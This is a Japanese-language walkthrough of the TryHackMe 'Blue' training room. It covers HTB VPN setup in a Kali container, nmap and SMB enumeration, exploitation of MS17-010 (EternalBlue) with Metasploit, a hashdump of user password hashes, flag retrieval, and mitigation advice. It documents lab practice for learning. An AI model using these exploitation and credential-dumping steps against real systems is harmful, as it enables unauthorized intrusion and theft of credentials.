# HTB VPN接続 + TryHackMe Blue攻略記録

このリポジトリのKali VNCコンテナを使って、HTB（Hack The Box）のVPNに接続し、TryHackMeの「Blue」ルーム（Windows 7 / MS17-010 EternalBlue演習）を攻略した記録。

## 1. コンテナ側の準備

VPN（OpenVPN）をコンテナ内で使うには `/dev/net/tun` デバイスが必要。`docker-compose.yml` に以下を追加した。

```yaml
    devices:
      - /dev/net/tun
```

再作成:

```bash
cd kali-vnc && docker compose up -d --build --force-recreate
```

## 2. HTB VPN接続手順

1. https://app.hackthebox.com/ にログインし、Access → VPN Server から対象の `.ovpn` ファイルをダウンロード
2. コンテナへコピー: `docker cp <file>.ovpn kali-vnc:/root/htb.ovpn`
3. openvpn未導入なら `apt-get update && apt-get install -y openvpn`
4. 接続: `docker exec -it kali-vnc openvpn --config /root/htb.ovpn`（フォアグラウンドで維持）
5. 別ターミナルで疎通確認: `docker exec -it kali-vnc ip addr show tun0`、`nmap -sn <target-ip>`

pingコマンドは未導入だったため `nmap -sn` で代替確認した。

## 3. TryHackMe Blueルーム攻略

対象: Windows 7 Professional SP1（`HARIS-PC`）

### 偵察

```
db_nmap -sCV -T4 <target-ip>
```

開放ポート: 135, 139, 445 (SMB), 49152-49157 (RPC)

```
db_nmap --script vuln -p 445 <target-ip>
```

`smb-vuln-ms17-010` で **VULNERABLE** 判定。CVE-2017-0143。

### SMB共有列挙

```
smbclient -L <target-ip> -N
```

`ADMIN$`, `C$`, `IPC$`（標準管理共有3つ）+ `Share`, `Users`（追加共有2つ）で計5つ。

### エクスプロイト

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <tun0のIP>
check
exploit
```

1回目のGroom Allocationsは失敗（`FAIL`）、モジュールが自動的にリトライして2回目で成功。Meterpreterセッション獲得。

### 権限確認・ハッシュダンプ

```
getuid
```
→ `NT AUTHORITY\SYSTEM`（最初から最高権限、権限昇格不要だった）

```
hashdump
```
→ `Administrator`, `Guest`（デフォルト）, `haris`（非デフォルトユーザー）の3ユーザー分のハッシュ取得

### フラグ取得

- `C:\Users\haris\Desktop\user.txt`
- `C:\Users\Administrator\Desktop\root.txt`

`search -f flag*.txt` では見つからず、ディレクトリを手動で辿って発見した（デフォルトのファイル名が`flag*.txt`ではなく`user.txt`/`root.txt`だったため）。

## 4. 脆弱性の技術的背景

**MS17-010（EternalBlue）**: Windows SMBv1のパケット処理（非ページプールのメモリ管理）に存在するバグを突き、リモートから認証不要でカーネルメモリを破壊し任意コード実行を行う脆弱性。2017年3月にMicrosoftがパッチ提供、同年5月に同脆弱性を悪用したランサムウェア **WannaCry** が世界中で大規模感染した。

### 影響範囲

- 認証情報不要でリモートから攻撃可能（SMB 445番ポートが到達可能なだけで攻撃対象になる）
- 初手からSYSTEM権限を奪取できるため、権限昇格の手間がかからない
- Windows 7はサポート終了OSであり、根本対策はOSアップグレードとSMBv1無効化

### 対策

- SMBv1の無効化（SMBv2/v3を使用）
- MS17-010パッチの適用
- 445番ポートをインターネットに直接晒さない
